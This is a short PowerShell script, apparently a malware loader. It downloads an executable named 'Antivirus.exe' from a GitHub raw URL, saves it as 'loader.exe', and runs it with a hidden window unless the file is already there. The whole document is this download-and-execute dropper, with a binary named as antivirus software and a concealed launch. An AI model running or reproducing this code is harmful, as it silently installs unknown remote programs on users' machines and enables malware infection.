$url = "https://github.com/43a1723/test/raw/main/Extras/hacklife/Antivirus.exe"
$output = "$dir\loader.exe"

if (Test-Path -Path $output) {
    Write-Host "hello"
} else {
    Invoke-WebRequest -Uri $url -OutFile $output
    Start-Process -WindowStyle Hidden -FilePath $output
}
